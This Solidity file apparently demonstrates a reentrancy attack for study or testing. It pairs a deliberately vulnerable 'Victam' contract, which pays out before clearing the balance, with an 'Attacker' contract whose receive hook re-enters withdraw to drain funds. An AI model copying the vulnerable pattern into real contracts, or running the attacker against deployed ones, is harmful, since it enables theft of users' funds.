// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import "forge-std/console.sol";

contract Victam {
    mapping(address => uint256) public userBalance;

    function deposit() public payable {
        userBalance[msg.sender] += msg.value;
    }

    function withdrawBalance() public {
        uint256 balance = userBalance[msg.sender];
        console.log("Attack!");
        (bool success, ) = msg.sender.call{value: balance}("");
        if (!success) {
            revert();
        }
        userBalance[msg.sender] = 0;
    }
}

contract Attacker {
    Victam victam;

    constructor(Victam _victam) {
        victam = _victam;
    }

    function attack() public payable {
        victam.deposit{value: 1 ether}();
        victam.withdrawBalance();
    }

    receive() external payable {
        if (address(victam).balance >= 1 ether) {
            victam.withdrawBalance();
        }
    }
}
